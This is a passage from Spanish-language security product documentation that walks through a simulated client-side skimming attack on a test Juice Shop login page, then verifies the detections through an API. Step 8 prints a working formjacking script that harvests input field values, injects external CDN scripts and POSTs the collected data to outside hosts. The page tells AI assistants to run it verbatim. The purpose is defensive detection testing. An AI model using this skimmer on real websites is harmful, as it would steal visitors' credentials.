## Paso 8: Simulación de Ataque

<Aside type="note">
Este paso requiere ejecución de JavaScript del lado del navegador — `curl` no puede desencadenar la detección de CSD. Los asistentes de IA con herramientas de automatización del navegador (MCP Chrome DevTools, Playwright, Puppeteer) ejecutan estos pasos directamente usando la secuencia de **Ejecución Automatizada por IA** a continuación. Los operadores sin automatización del navegador realizan los pasos manuales.
</Aside>

Después de verificar la infraestructura (todas las comprobaciones del Paso 7 de la Fase 1 PASAN), ejecute los scripts de simulación de ataque para generar detecciones de CSD. Los scripts se definen en la guía [Trigger Detection](/csd/trigger-detection/) y en la [Attack Script Library](/csd/attack-scripts/).

### Ejecución Automatizada por IA

Los asistentes de IA con herramientas de automatización del navegador ejecutan la simulación de ataque mediante programación:

1. **Navegar con initScript** — primero navegue a `about:blank` para asegurar un contexto de documento limpio (evita initScripts obsoletos de navegaciones previas), luego `navigate_page` a `http://$F5XC_DOMAINNAME/#/login` con un `initScript` que guarde `setInterval`, `clearInterval`, `fetch`, y `console.log` nativos antes de que zone.js los parchee, sondee los campos del formulario de inicio de sesión, rellene las credenciales usando el setter nativo de `HTMLInputElement.prototype.value`, y ejecute inmediatamente el script de detección combinado en línea. Use el initScript verbatim a continuación.
2. **Descartar el Banner de Bienvenida** — `press_key` con `Escape` para cerrar el Banner de Bienvenida. En visitas posteriores el banner puede no aparecer (cookies persistidas). El diálogo de consentimiento de cookies se descarta automáticamente con la tecla Escape
3. **Esperar a la finalización** — espere 10 segundos para que todas las devoluciones de llamada de carga de CDN/error y resoluciones de promesas fetch se completen
4. **Capturar evidencia** — `list_console_messages` para verificar `[CSD Demo] Simulation complete` y resultados de carga de CDN; `list_network_requests` filtrado por tipos `script` y `fetch` para verificar códigos de estado HTTP (`200`/`201` para éxito, `pending` para solicitudes retenidas)

**initScript de Fase 2 (verbatim — use exactamente como se escribió):**

```javascript
// Save native references before zone.js patches them
var _si = window.setInterval.bind(window);
var _ci = window.clearInterval.bind(window);
var _fetch = window.fetch.bind(window);
var _log = window.console.log.bind(window.console);

// Poll for login form fields, fill credentials, run detection script
var _poll = _si(function() {
  var emailEl = document.querySelector('#email');
  var passEl  = document.querySelector('#password');
  if (emailEl && passEl) {
    _ci(_poll);
    // Fill credentials via native setter (bypasses zone.js)
    var nativeSet = Object.getOwnPropertyDescriptor(
      window.HTMLInputElement.prototype, 'value').set;
    nativeSet.call(emailEl, 'test@example.com');
    emailEl.dispatchEvent(new Event('input', { bubbles: true }));
    nativeSet.call(passEl, 'P@ssword123');
    passEl.dispatchEvent(new Event('input', { bubbles: true }));

    // Run Combined Detection Script inline using native fetch for exfil
    (function() {
      _log('==================================================');
      _log('[CSD Demo] Combined Detection Script — Starting');
      _log('==================================================');

      _log('\n[Formjack] Phase 1: Form field harvesting');
      var inputs = document.querySelectorAll('input');
      var harvested = {};
      inputs.forEach(function(input) {
        var name = input.name || input.id || input.type;
        harvested[name] = input.value || '(empty)';
      });
      _log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);

      _log('\n[Supply Chain] Phase 2: Multi-CDN script injection');
      var cdns = [
        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
      ];
      cdns.forEach(function(cdn) {
        var script = document.createElement('script');
        script.src = cdn.url;
        script.onload = function() { _log('[Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url); };
        script.onerror = function() { _log('[Supply Chain] Blocked/failed from ' + cdn.name + ': ' + cdn.url); };
        document.head.appendChild(script);
        _log('[Supply Chain] Injected script tag: ' + cdn.name);
      });

      _log('\n[Exfil] Phase 3: Data exfiltration');
      var payload = JSON.stringify({
        type: 'combined_demo', credentials: harvested,
        page: window.location.href, timestamp: Date.now()
      });
      _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
        .then(function() { _log('[Exfil] Data sent to www.httpbin.org'); });
      _fetch('https://jsonplaceholder.typicode.com/posts', {
        method: 'POST', mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' }, body: payload
      }).then(function() { _log('[Exfil] Data sent to jsonplaceholder.typicode.com'); });

      _log('\n==================================================');
      _log('[CSD Demo] Simulation complete');
      _log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
      _log('[CSD Demo] Scripts injected: 4 (4 CDN domains)');
      _log('[CSD Demo] Exfil channels: 2 (fetch POST)');
      _log('==================================================');
    })();
  }
}, 300);
```

<Aside type="caution">
**Incompatibilidad de zone.js** — Juice Shop usa zone.js de Angular, que parchea `setTimeout`, `setInterval`, `fetch`, `XMLHttpRequest` y otras APIs del navegador. Esto rompe las herramientas MCP `evaluate_script`, `fill` y `click` con `Cannot read properties of undefined (reading 'call')`. Use `navigate_page` con `initScript` en su lugar — `initScript` se ejecuta antes de que zone.js cargue, por lo que puede guardar referencias de API nativas y usarlas en devoluciones de llamada de sondeo. El initScript debe rellenar los campos del formulario usando el setter nativo de `HTMLInputElement.prototype.value` (no `fill`) y ejecutar el script de detección en línea (no a través de `setTimeout`, que zone.js puede interceptar después de la carga de la página). Véase [Trigger Detection — AI-Automated Execution](/csd/trigger-detection/#ai-automated-execution) para obtener detalles.
</Aside>

<Aside type="note">
**Acumulación de initScript** — cada llamada `navigate_page` con un parámetro `initScript` agrega el script a una lista persistente que se ejecuta en cada carga de documento posterior. Para evitar que scripts obsoletos interfieran, navegue a `about:blank` entre ejecuciones o use `new_page` con `isolatedContext` para un contexto de navegador limpio.
</Aside>

<Aside type="note">
**Guardar `fetch` nativo en el initScript** — el initScript guarda `window.fetch.bind(window)` antes de que zone.js lo parchee. Esto asegura que las llamadas fetch funcionen correctamente sin errores de `Cannot read properties of undefined` de zone.js. El mismo initScript (con `fetch` nativo guardado) se utiliza para las ejecuciones de ataque de Fase 2 y Fase 3 — la mitigación de CSD no intercepta llamadas `fetch()`, por lo que guardar la referencia nativa no afecta el comportamiento de mitigación.
</Aside>

<Aside type="caution">
**Origen transitorio 404** — en la primera navegación a la aplicación Angular, `polyfills.js` u otros scripts de la aplicación pueden devolver un HTTP 404 transitorio del servidor de origen. Esto causa que Angular falle en el bootstrap, resultando en una página en blanco sin formulario de inicio de sesión. El 404 es efímero — las solicitudes posteriores devuelven 200 o 304. **Recuperación:** navegue a `about:blank`, espere 2 segundos, luego reintente la navegación. Si el problema persiste en múltiples reintentos, compruebe la salud del origen a través de la ruta del equilibrador de carga (`curl -s -o /dev/null -w '%{http_code}' http://$F5XC_DOMAINNAME/polyfills.js`).
</Aside>

### Ejecución Manual

Los operadores sin herramientas de automatización del navegador realizan los pasos manualmente:

1. **Navegar** a la página de inicio de sesión de la aplicación protegida: `http://xF5XC_DOMAINNAMEx/#/login`
2. **Ingresar credenciales ficticias** — escriba `test@example.com` en el campo Email y `P@ssword123` en el campo Password (no envíe el formulario)
3. **Abrir DevTools** — presione **F12** y cambie a la pestaña **Console**
4. **Ejecutar el Script de Detección Combinado** — pegue el script de [Trigger Detection &mdash; Run the Combined Simulation Script](/csd/trigger-detection/#run-the-combined-simulation-script) en la consola y presione Enter
5. **Verificar salida de consola** — confirme que la salida por fases `[CSD Demo]` muestra: recopilación de campos del formulario, inyección de scripts desde 4 dominios de CDN, y exfiltración de datos a 2 endpoints

### Qué Se Desencadena

| Señal | Comportamiento | Detección |
| --- | --- | --- |
| Recopilación de campos del formulario | Lee valores de campos de entrada de correo electrónico y contraseña | Scripts leyendo campos de formulario sensibles — marcados como Alto Riesgo |
| Inyección de scripts | Inyecta 4 etiquetas `&lt;script&gt;` desde `cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, `ga.jspm.io` | Hasta 4 nuevos dominios de scripts de terceros detectados (la disponibilidad de CDN varía) |
| Exfiltración de datos | Envía datos recopilados a través de `fetch` a `www.httpbin.org` y `jsonplaceholder.typicode.com` | Llamadas de red a dominios externos |

<Aside type="note">
**La disponibilidad de CDN varía.** No todos los 4 scripts de CDN cargarán en cada ejecución — los límites de recursos del navegador, las condiciones de red o la limitación de velocidad del CDN pueden causar que algunos fallen con `ERR_INSUFFICIENT_RESOURCES` o tiempo de espera. La simulación tiene éxito si **cualquier** script de CDN carga. CSD detecta el intento de inyección independientemente de si el script carga exitosamente — la creación de la etiqueta `&lt;script&gt;` en sí es la señal de detección.

En casos severos, `ERR_INSUFFICIENT_RESOURCES` puede escalarse a una falla a nivel de página — la página completa se vuelve en blanco, los tiempos de espera de captura de pantalla se agotan y `take_snapshot` falla. Esto típicamente ocurre después de que múltiples navegaciones con initScripts pesados se acumulan en el mismo contexto del navegador. **Recuperación:** use `new_page` con `isolatedContext` para crear un contexto de navegador fresco, luego reintente desde la secuencia `about:blank` → `navigate_page` con initScript. Esto es distinto de las fallas de scripts de CDN individuales, que no afectan el éxito de la simulación.
</Aside>

<Aside type="tip">
Después de ejecutar la simulación de ataque, use este bucle de sondeo determinista para esperar las detecciones:

1. Consulte `/detected_domains` cada 60 segundos
2. Si DET-3 pasa (los dominios de exfiltración aparecen en `/detected_domains`), proceda al Paso 9 inmediatamente
3. Si todavía está vacío después de 10 consultas (10 minutos), verifique el estado de CSD (Paso 5 de Fase 1) y el registro de dominio protegido (Paso 6 de Fase 1) — uno de estos probablemente esté mal configurado
4. Si todavía está vacío después de 30 consultas (30 minutos), detenga e informe al operador — no continúe a Fase 3

Para simulaciones dirigidas adicionales (categorías de ataque individuales, prueba de estrés de detección máxima), véase la [Attack Script Library](/csd/attack-scripts/).
</Aside>

## Paso 9: Verificación de Detección a través de API

Consulte los endpoints de la API de CSD para confirmar que las detecciones aparecieron. Use el bucle de sondeo: consulte `/detected_domains` cada 60 segundos; proceda tan pronto como DET-3 pase. Si DET-3 no pasa después de 10 minutos, verifique la configuración de CSD. Si DET-3 no pasa después de 30 minutos, detenga e informe al operador. Estos endpoints se documentan en la [API Reference](/csd/api-reference/) y utilizan la misma autenticación y espacio de nombres que los pasos anteriores.

<Aside type="note">
**Orden de procesamiento del endpoint:** `/detected_domains` se rellena primero y es el indicador principal de que la canalización de CSD está funcionando. `/scripts` y `/formFields` se rellenan en un cronograma de procesamiento de backend más lento y pueden permanecer vacíos durante 20–30 minutos incluso después de múltiples ejecuciones de simulación. Si `/detected_domains` muestra dominios de exfiltración (`www.httpbin.org`, `jsonplaceholder.typicode.com`), trate la simulación como detectada exitosamente y proceda — la comprobación DET-1 a continuación refleja esto.
</Aside>

### Campos del Formulario

```bash
NOW=$(date +%s)
START=$(( NOW - 86400 ))
curl -s \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/formFields?startTime=$START&endTime=$NOW" \
  | jq '{total: .total_size, fields: [.form_fields[]? | {name: .name, sensitivity: .analysis.value, scripts: (.associated_scripts | length), locations: .locations}]}'
```

| Campo | Esperado | Estado |
| --- | --- | --- |
| `total` | > 0 | PASS si > 0; PENDING si 0 pero DET-3 pasa |
| `name` | Incluye `email`, `password` | PASS si aparecen campos sensibles |
| `sensitivity` | `Sensitive` para campos de correo electrónico/contraseña | PASS si ML clasificó correctamente |

<Aside type="note">
**El procesamiento de campos del formulario es más lento que la detección de dominios.** El endpoint `/formFields` puede devolver campos con metadatos parciales en la primera consulta. La clasificación de sensibilidad de ML (`Sensitive` vs `Not Sensitive`) se rellena después de que se completa el procesamiento de backend — esto puede tomar 20–30 minutos después de la primera ejecución de simulación. Si los campos aparecen pero carecen de clasificación, consulte más tarde. DET-3 (`/detected_domains`) es el criterio de pase principal.
</Aside>
